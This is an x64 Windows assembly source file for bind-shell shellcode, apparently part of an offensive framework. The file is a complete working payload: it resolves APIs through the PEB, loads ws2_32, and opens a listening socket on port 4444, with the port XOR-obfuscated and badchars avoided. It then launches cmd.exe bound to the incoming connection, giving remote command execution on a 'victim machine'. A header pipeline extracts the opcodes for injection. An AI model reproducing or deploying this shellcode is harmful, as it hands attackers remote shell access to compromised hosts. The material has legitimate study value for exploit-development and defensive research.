;Template: lifting a port on the victim machine using the PEB method
;Author: Samir sanchez garnica
;@sasaga92
;compile: using fasm (nasm file.asm)
;extract opcodes: objdump -d ./file.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
;project: OSIRIS-FRAMEWORK

format pe64 console

entry _start

_start:
        ;get dll base addresses
        sub rsp, 28h                ;reserve stack space for called functions
        and rsp, 0fffffffffffffff0h ;make sure stack 16-byte aligned
        xor edx, edx
        mov r12, [gs:edx+60h]      ;peb
        mov r12, [r12 + 0x18]      ;Peb --> LDR
        mov r12, [r12 + 0x20]      ;Peb.Ldr.InMemoryOrderModuleList
        mov r12, [r12]             ;2st entry
        mov r15, [r12 + 0x20]      ;ntdll.dll base address!
        mov r12, [r12]             ;3nd entry
        mov r12, [r12 + 0x20]      ;kernel32.dll base address! We go 20 bytes in here as we are already 10 bytes into the _LDR_DATA_TABLE_ENTRY from the InMemoryOrderModuleList

        ; Parse kernel32 PE
        xor r15, r15
        mov r8d, [r12 + 0x3c]      ; R8D = DOS->e_lfanew offset
        mov r15, r8                ; R15 = DOS->e_lfanew
        add r15, r12               ; r15 = PE Header
        mov dl, 0x88               ; save 0x88 in dl to avoid badchars
        mov r8d, [r15 + rdx]       ; R8D = Offset export table
        add r8, r12                ; R8 = Export table
        xor rsi, rsi               ; Clear RSI
        mov esi, [r8 + 0x20]       ; RSI = Offset namestable
        add rsi, r12               ; RSI = Names table
        xor rcx, rcx               ; RCX = 0
        mov r9, 0x41636f7250746547 ; GetProcA


getFunction:
        ; Loop through exported functions and find GetProcAddress
        inc rcx                    ; Increment the ordinal
        xor r15, r15               ; r15 = 0
        mov r15d, [rsi + rcx * 4]  ; Get name offset
        add r15, r12               ; Get function name
        cmp QWORD [r15], r9        ; GetProcA ?
        jnz getFunction
        xor rsi, rsi               ; RSI = 0
        mov esi, [r8 + 0x24]       ; ESI = Offset ordinals
        add rsi, r12               ; RSI = Ordinals table
        mov cx, [rsi + rcx * 2]    ; Number of function
        xor rsi, rsi               ; RSI = 0
        mov esi, [r8 + 0x1c]       ; Offset address table
        add rsi, r12               ; ESI = Address table
        xor rdx, rdx               ; RDX = 0
        mov edx, [rsi + rcx * 4]   ; EDX = Pointer(offset)
        add rdx, r12               ; RDX = GetProcAddress
        mov bl,0x70               ; reserve memory to save pointers base address
        sub rsp,rbx
        lea r13,[rsp]              ; obtainer to pointer bault to save pointers base address
        mov qword [r13+0x70], rdx  ; Save GetProcAddress in [r13+0x77]

getLoadLibraryA:
        ; Use GetProcAddress to find the address of LoadLibrary
        mov r15, 0x41797261          ; aryA
        push r15                     ; Push on the stack
        mov r15, 0x7262694c64616f4c  ; LoadLibr
        push r15                     ; Push on stack
        mov rdx, rsp                 ; LoadLibraryA
        mov rcx, r12                 ; kernel32.dll base address
        sub rsp, 0x30                ; Allocate stack space for function call
        call qword [r13+0x70]        ; call GetProcAddress
        add rsp, 0x40                ; Cleanup allocated stack space and for LoadLibrary string
        mov qword [r13+0x60], rax    ; LoadLibrary saved in [r13+0x67]

getWs2_32Dll:
        mov r14w, 0x6c6c              ; ll
        mov r15, r14                  ; mov string dword to qword evade badchars
        push r15                      ; Push on the stack
        mov r15, 0x642e32335f327377   ; ws2_32.d
        push r15                      ; Push on stack
        mov rcx, rsp                  ; ws2_32.dll.dll
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x60]         ; Call LoadLibraryA
        add rsp, 0x40                 ; Cleanup allocated stack space and for ws2_32.dll string
        mov qword [r13+0x50], rax     ; Save Base address of ws2_32.dll in [r13+0x57]


findAndCallWsaStarTup:
        ; find to base address WSAStartup
        mov r14w, 0x7075              ; up
        mov r15, r14                  ; mov string dword to qword evade badchars
        push r15                      ; Push on the Stack
        mov r14, 0x7472617453415357   ; WSAStart
        push r14                      ; Push on the Stack
        mov rdx, rsp                  ; WSAStartup();
        mov qword rcx, [r13+0x50]     ; ws2_32.dll base address
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x70]         ; Call GetProcAddress
        add rsp, 0x40                 ; Cleanup allocated stack space and WSAStartup string
        mov rbx, rax     ; WSAStartup(); saved in [r13+0x47]

        ;WSAStartup(514,&WSADATA)
        xor rcx,rcx                   ; clean to register rcx
        lea rdx,[rsp]                 ; obtainer to pointer rsp
        mov cl,0x70                    ; we move 0x1f8 to the lowest 4 bytes of the register
        sub rsp,112                    ; Allocate stack space for function call
        call rbx                      ; call to WSAStartup

findAndCallWSASocketA:
        xor r14, r14
        mov r14w, 0x4174              ; tA
        mov r15, r14                  ; mov string dword to qword evade badchars
        push r15                      ; Push on the Stack
        mov r14, 0x656b636f53415357   ; WSASocke
        push r14                      ; Push on the Stack
        mov rdx, rsp                  ; WSASocketA();
        mov qword rcx, [r13+0x50]     ; ws2_32.dll base address
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x70]         ; Call GetProcAddress
        add rsp, 0x40                 ; Cleanup allocated stack space and WSASocketA string
        mov rbx, rax                  ; WSASocketA(); saved in [r13+236]

        ;WSASocket(2,1,6,0,0,0)
        sub rsp, 112
        push 6                        ;we send the value 6 as a parameter to the stack
        push 1                        ;we send the value 1 as a parameter to the stack
        push 2                        ;we send the value 2 as a parameter to the stack
        pop rcx                       ;We retrieve the values â€‹â€‹sent to the stack as parameters
        pop rdx
        pop r8
        xor r9,r9                     ;clean to register r9
        mov [rsp+32],r9               ;we move 0 to the assigned offset
        mov [rsp+40],r9
        call rbx                      ; call to WSASocketA
        mov qword [r13+0x40],rax      ;Save to socket reference in r13+0x47

findAndcallSetSockOpt:
        xor r14, r14
        mov r14w, 0x7470              ; tA
        mov r15, r14                  ; mov string dword to qword evade badchars
        push r15                      ; Push on the Stack
        mov r14, 0x6F6B636F73746573   ; WSASocke
        push r14                      ; Push on the Stack
        mov rdx, rsp                  ; WSASocketA();
        mov qword rcx, [r13+0x50]     ; ws2_32.dll base address
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x70]         ; Call GetProcAddress
        add rsp, 0x40                 ; Cleanup allocated stack space and WSASocketA string
        mov rbx, rax                  ; WSASocketA(); saved in [r13+236]

        ; ;setsockopt(SOCKET,0xffff,4,&1,4)
        xor rdx,rdx
        mov rcx, qword [r13+0x40]
        mov dx,0xffff

        push 4

        pop r8

        mov [rsp],byte 1
        lea r9,[rsp]

        sub rsp,88
        mov  [rsp+32],r8
        call rbx

        ;--------------------------------------------------

findAndCallBind:
        mov r14, 0x646E6962           ; bind
        push r14                      ; Push on the Stack
        mov rdx, rsp                  ; bind();
        mov qword rcx, [r13+0x50]     ; ws2_32.dll base address
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x70]         ; Call GetProcAddress
        add rsp, 0x40                 ; Cleanup allocated stack space and for bind string
        mov rbx, rax                  ; bind(); saved in [r13+220]

        ;bind(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)
        push 16
        pop r8
        xor rdx,rdx
        mov [rsp],rdx
        mov [rsp+8],rdx
        mov [rsp],byte 2
        mov edx, dword 0xffffa3ee       ;port 4444 xor 0xffffffff (change it if U want)
        xor edx, 0xffffffff             ;xor to port to key 0xffffffff
        mov [rsp+2], edx                ;move to port 4444 (change it if U want)
        lea rdx,[rsp]
        mov rcx,qword [r13+0x40]
        sub rsp, 0x30
        call rbx

findAndCallListen:
        mov r14, 0x41416e657473696c   ; listenAA
        push r14                      ; Push on the Stack
        sub word [rsp + 0x6], 0x4141  ; Remove "AA"
        mov rdx, rsp                  ; listen();
        mov qword rcx, [r13+0x50]     ; ws2_32.dll base address
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x70]         ; Call GetProcAddress
        add rsp, 0x30                 ; Cleanup allocated stack space and for listen string
        mov rbx, rax                  ; listen(); saved in [r13+204]

        sub rsp, 0x28
        push 1
        pop rdx
        push qword [r13+0x40]
        pop rcx
        call rbx
        add rsp, 0x28

findAndCallAccept:
        mov r14, 0x4141747065636361   ; acceptAA
        push r14                      ; Push on the Stack
        sub word [rsp + 0x6], 0x4141  ; Remove "AA"
        mov rdx, rsp                  ; accept();
        mov qword rcx, [r13+0x50]     ; ws2_32.dll base address
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x70]         ; Call GetProcAddress
        add rsp, 0x40                 ; Cleanup allocated stack space and for accept string
        mov rbx, rax                  ; accept(); saved in [r13+188]


        ;accept(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)
        xor rdx,rdx
        mov [r13+8],rdx
        mov [r13+16],rdx
        mov dl,16
        push rdx
        lea r8,[rsp]
        lea rdx,[r13+8]
        mov rcx,qword [r13+0x40]
        sub rsp,0x40
        call rbx
        mov r15,rax
        add rsp, 0x40

findAndCallCreateProcessA:
        mov r14, 0x414141737365636f   ; ocessAAA
        push r14                      ; Push on the Stack
        sub word [rsp + 0x6], 0x4141  ; Remove "AA"
        mov r14, 0x7250657461657243   ; CreatePr
        push r14                      ; Push on the Stack
        mov rdx, rsp                  ; CreateProcessA();
        mov qword rcx, r12            ; kernel32 base address
        sub rsp, 0x30                 ; Allocate stack space for function call
        call qword [r13+0x70]         ; Call GetProcAddress
        add rsp, 0x48                 ; Cleanup allocated stack space and for CreateProcessA string
        mov rbx, rax                  ; CreateProcessA(); saved in rbx
        mov r12, [r13+0x70]           ; save GetProcAddress

        mov [r13-4],dword 'cmdA'
        mov [r13-1],byte cl
        lea rdx, [r13-4]              ;pointer to "cmd"

        xor ecx, ecx
        sub rsp, 0x68
        lea rbp, [rsp]

        mov rdi, rbp                  ; pointer for ProcessInformation
        add rsp, 0x68

        lea r13, [r13+8]              ; pointer for struct StartupInfo

        ;struct StartupInfo
        mov cl, 0x68
        mov [r13+4],rcx               ;save to size struct 0x68
        xor rcx, rcx                  ;clean register
        mov [r13+8], rcx              ;save null in the assigned structure offset
        mov [r13+16], rcx             ;save null in the assigned structure offset
        mov cl,255                    ;move to value cl
        inc rcx                       ;increase the value and get 0x0000000000000100
        mov [r13+60],ecx              ;save the new value in the offset
        xor rcx, rcx                  ;clean register
        mov [r13+72],rcx              ;save null in the assigned structure offset
        mov [r13+80], r15             ;save the reference socket number in the assigned structure offset
        mov [r13+88], r15             ;save the reference socket number in the assigned structure offset
        mov [r13+96], r15             ;save the reference socket number in the assigned structure offset
        mov rax, r13                  ;move the pointer for StartupInfo in the EAX register

        ;kernel32_CreateProcessA(NULL, CMD, NULL, NULL, TRUE, 0, NULL, NULL, &STARTUPINFOA, &PROCESS_INFORMATION)
        mov r8, rcx                   ;save null in the assigned register
        mov r9, rcx                   ;save null in the assigned register
        mov [rsp+72],rdi              ;save the ProcessInformation pointer in the assigned structure offset
        mov [rsp+64],rax              ;save the StartupInfo pointer in the assigned structure offset
        mov [rsp+56],r8               ;save null in the assigned structure offset
        mov [rsp+48],r8               ;save null in the assigned structure offset
        mov [rsp+40],r8               ;save null in the assigned structure offset 
        mov [rsp+32],byte 1           ;save TRUE in the assigned structure offset
        call rbx                      ;call the CreateProcessA function